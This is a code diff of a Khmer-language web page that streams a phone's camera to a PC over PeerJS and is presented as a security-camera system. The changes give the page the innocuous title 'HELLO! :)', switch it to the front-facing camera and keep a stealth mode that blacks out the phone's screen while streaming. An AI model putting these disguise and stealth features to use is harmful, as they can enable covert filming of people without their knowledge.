@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ប្រព័ន្ធកាមេរ៉ាសុវត្ថិភាព សកល (Android & iOS)</title>
+    <title>HELLO! :)</title>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1e1e1e; color: #fff; text-align: center; margin: 0; padding: 20px; transition: background 0.3s; }
@@ -12,20 +12,26 @@
         #status { color: #ffc107; font-weight: bold; margin: 15px 0; font-size: 20px; }
         .device-badge { display: inline-block; padding: 6px 12px; background: #444; border-radius: 20px; font-size: 14px; margin-bottom: 10px; color: #aaa; }
         
+        /* ប៊ូតុងបិទពិសេស បង្ហាញតែលើទូរសព្ទ */
+        .btn-disconnect { display: none; background: #dc3545; color: white; border: none; padding: 12px 24px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; margin-top: 15px; width: 100%; }
+        .btn-disconnect:hover { background: #c82333; }
+
         .stealth-mode { background: #000 !important; }
         .stealth-mode .container { opacity: 0.005 !important; }
     </style>
 </head>
 <body>
 
-    <h2 id="main-title">ប្រព័ន្ធកាមេរ៉ាសុវត្ថិភាព (Android & iOS)</h2>
+    <h2 id="main-title">ប្រព័ន្ធកាមេរ៉ាសុវត្ថិភាព Smart Web (កាមេរ៉ាមុខ)</h2>
     
     <div class="container" id="main-container">
         <div id="device-type" class="device-badge">កំពុងពិនិត្យឧបករណ៍...</div>
         <div id="status">កំពុងចាប់ផ្តើមប្រព័ន្ធ...</div>
-        <p id="hint" style="color: #bbb; display: none;">💡 ចុចលើអេក្រង់ត្រង់ណាក៏បាន ១ដង ដើម្បីលាក់អេក្រង់ឱ្យងងឹតឈឹង! (ចុចម្តងទៀតដើម្បីបើកវិញ)</p>
+        <p id="hint" style="color: #bbb; display: none;">💡 ចុចលើផ្ទៃអេក្រង់ទំនេរ ដើម្បីលាក់អេក្រង់ខ្មៅ! (ចុចម្តងទៀតដើម្បីបើកវិញ)</p>
         
         <video id="view-video" autoplay playsinline muted style="display: none;"></video>
+        
+        <button id="btn-close" class="btn-disconnect" onclick="disconnectPhone(event)">🛑 បិទកាមេរ៉ា (ដោះលែងប្រព័ន្ធ)</button>
     </div>
 
     <script>
@@ -45,13 +51,15 @@
                 runAsPC();
             } else {
                 document.getElementById('device-type').innerText = "📱 ឧបករណ៍៖ ទូរសព្ទ (Android/iOS)";
+                document.getElementById('btn-close').style.display = 'block'; 
                 
-                // មុខងារចុចដើម្បីលាក់អេក្រង់ខ្មៅ
-                document.body.onclick = function() {
-                    toggleStealthMode();
+                document.body.onclick = function(e) {
+                    if(e.target.id !== 'btn-close') {
+                        toggleStealthMode();
+                    }
                 };
                 
-                startAndroidCamera();
+                startCamera();
             }
         };
 
@@ -85,28 +93,17 @@
                     currentCall = null; 
                 });
             });
-
-            peer.on('error', (err) => {
-                setTimeout(runAsPC, 2000);
-            });
         }
 
-        // --- កូដសម្រាប់ ទូរសព្ទ Android ---
-        function startAndroidCamera() {
-            document.getElementById('status').innerText = "🎥 កំពុងសុំសិទ្ធិបើកកាមេរ៉ាក្រោយ...";
+        // --- កូដសម្រាប់ ទូរសព្ទ ---
+        function startCamera() {
+            document.getElementById('status').innerText = "🎥 កំពុងបើកកាមេរ៉ាមុខ...";
             
-            // កំណត់កូដកាមេរ៉ាឱ្យត្រូវស្តង់ដារ Android និង iOS
-            const constraints = {
-                video: {
-                    facingMode: { ideal: "environment" }, // ប្រើកាមេរ៉ាក្រោយ
-                    width: { ideal: 640 },
-                    height: { ideal: 480 },
-                    frameRate: { ideal: 10 }
-                },
+            // 🛠️ បានកែប្រែត្រង់នេះទៅជា "user" ដើម្បីបង្ខំឱ្យបើកកាមេរ៉ាមុខ
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user", width: 640, height: 480 },
                 audio: false
-            };
-            
-            navigator.mediaDevices.getUserMedia(constraints)
+            })
             .then((stream) => {
                 localStream = stream;
                 const video = document.getElementById('view-video');
@@ -116,8 +113,7 @@
                 connectToPC();
             })
             .catch((err) => {
-                document.getElementById('status').innerText = "⚠️ Android បដិសេធកាមេរ៉ា! សូមចូលទៅ Settings > Apps > Chrome > Permissions រួចបើក Camera បាទ។";
-                console.error(err);
+                document.getElementById('status').innerText = "⚠️ មិនអាចបើកកាមេរ៉ាបានទេ! សូមពិនិត្យមើលសិទ្ធិការអនុញ្ញាត (Camera Permission)។";
             });
         }
 
@@ -127,29 +123,39 @@
 
             peer.on('open', (id) => {
                 document.getElementById('status').innerText = "🔗 កំពុងបាញ់វីដេអូទៅកុំព្យូទ័រ...";
-                
                 const call = peer.call(PC_PEER_ID, localStream);
                 
                 if (call) {
+                    currentCall = call;
                     document.getElementById('hint').style.display = 'block';
                     
                     call.on('close', () => {
-                        document.getElementById('status').innerText = "🔄 ដាច់ការភ្ជាប់! កំពុងភ្ជាប់ឡើងវិញ...";
+                        document.getElementById('status').innerText = "🔄 បានដាច់ការភ្ជាប់! កំពុងរង់ចាំភ្ជាប់ឡើងវិញ...";
                         if(isStealth) toggleStealthMode(); 
-                        setTimeout(connectToPC, 4000);
+                        currentCall = null;
                     });
                 }
             });
 
             peer.on('error', (err) => {
-                document.getElementById('status').innerText = "🔄 កុំព្យូទ័រមិនទាន់បើក! កំពុងរង់ចាំភ្ជាប់ឡើងវិញ...";
+                document.getElementById('status').innerText = "🔄 កុំព្យូទ័រជាប់រវល់ ឬមិនទាន់បើក! កំពុងព្យាយាមឡើងវិញ...";
                 setTimeout(connectToPC, 4000);
             });
         }
 
-        // --- មុខងារលាក់អេក្រង់ងងឹត (Stealth Mode) ---
+        function disconnectPhone(e) {
+            e.stopPropagation(); 
+            if (currentCall) currentCall.close();
+            if (peer) peer.destroy();
+            if (localStream) localStream.getTracks().forEach(track => track.stop()); 
+            
+            document.getElementById('status').innerText = "🛑 បានបិទកាមេរ៉ារួចរាល់! អ្នកអាចយកទូរសព្ទផ្សេងមកតេស្តបានហើយ។";
+            document.getElementById('view-video').style.display = 'none';
+        }
+
+        // --- មុខងារលាក់អេក្រង់ងងឹត ---
         async function toggleStealthMode() {
-            if (document.getElementById('status').innerText.includes("បាញ់វីដេអូ") || document.getElementById('status').innerText.includes("ជោគជ័យ")) {
+            if (document.getElementById('status').innerText.includes("បាញ់វីដេអ") || document.getElementById('status').innerText.includes("ជោគជ័យ")) {
                 isStealth = !isStealth;
                 const title = document.getElementById('main-title');
 
